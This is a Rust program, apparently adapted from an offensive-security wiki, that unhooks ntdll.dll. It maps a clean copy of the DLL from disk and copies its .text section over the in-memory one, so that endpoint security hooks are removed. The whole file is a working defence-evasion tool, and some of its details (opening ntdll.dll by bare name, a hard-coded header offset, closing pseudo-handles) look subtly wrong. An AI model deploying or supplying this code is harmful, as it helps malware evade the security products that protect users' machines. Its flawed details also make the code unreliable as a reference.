/*
    DLL Unhooking 
    Thanks to RedTeamNotes: 
        Resource Used From [https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++]
    @5mukx
*/


use std::ffi::CString;
use std::ptr::{self, null_mut};

use winapi::shared::minwindef::HMODULE;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::memoryapi::{MapViewOfFile, VirtualProtect, FILE_MAP_READ};
use winapi::um::psapi::GetModuleInformation;
use winapi::um::winbase::CreateFileMappingA;
use winapi::um::winnt::{GENERIC_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, PAGE_EXECUTE_READWRITE, PAGE_READONLY, SEC_IMAGE};
use winapi::um::{processthreadsapi::GetCurrentProcess, psapi::MODULEINFO};
use winapi::ctypes::c_void;


// macro_rules! error {
//     ($msg:expr, $(arg:expr), *) => {
//         println!("\\_____{} ", format($msg, $(arg), *));
//     }
// }


fn main(){
    unsafe{
        let process: *mut c_void = GetCurrentProcess();
        let mut mi: MODULEINFO = std::mem::zeroed();
        let ntdll_cstr = CString::new("ntdll.dll").unwrap();
        let ntdll_module: HMODULE = GetModuleHandleA(ntdll_cstr.as_ptr());

        GetModuleInformation(
            process,
            ntdll_module,
            &mut mi,
            std::mem::size_of::<MODULEINFO>() as u32,
        );

        let ntdll_base = mi.lpBaseOfDll;
        let ntdll_file = CreateFileA(
            ntdll_cstr.as_ptr(),
            GENERIC_READ,
            0,
            null_mut(),
            OPEN_EXISTING, 
            0,
            null_mut(),
        );

        let ntdll_mapping = CreateFileMappingA(
            ntdll_file, 
            null_mut(), 
            PAGE_READONLY | SEC_IMAGE, 
            0, 
            0, 
            ptr::null(),
        );

        let ntdll_mapping_address = MapViewOfFile(
            ntdll_mapping,
            FILE_MAP_READ,
            0,
            0,
            0
        );

        let hook_dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
        let hook_nt_header = (ntdll_base as usize + (*hook_dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        for i in 0..(*hook_nt_header).FileHeader.NumberOfSections{
            let hook_sec_header = (hook_nt_header as usize + 0xF8 + (i as usize * 0x28)) as *const IMAGE_SECTION_HEADER;

            if (*hook_sec_header).Name.starts_with(b".text\0") {
                let mut old_protect = 0u32;
                let section_base = (ntdll_base as usize + (*hook_sec_header).VirtualAddress as usize) as *mut u8;
                let section_size = *(*hook_sec_header).Misc.VirtualSize() as usize;

                VirtualProtect(
                    section_base as *mut _, 
                    section_size, 
                    PAGE_EXECUTE_READWRITE, 
                    &mut old_protect,
                );

                std::ptr::copy_nonoverlapping(
                    (ntdll_mapping_address as usize + (*hook_sec_header).VirtualAddress as usize) as *const u8, // Source Address
                    section_base, // Destination Address  
                    section_size, // Size 
                );

                VirtualProtect(
                    section_base as *mut _, 
                    section_size,
                    old_protect, 
                    &mut old_protect,
                ); 
            }
        }
        CloseHandle(process);
        CloseHandle(ntdll_file);
        CloseHandle(ntdll_mapping);
        CloseHandle(ntdll_module as *mut c_void);
    }
}
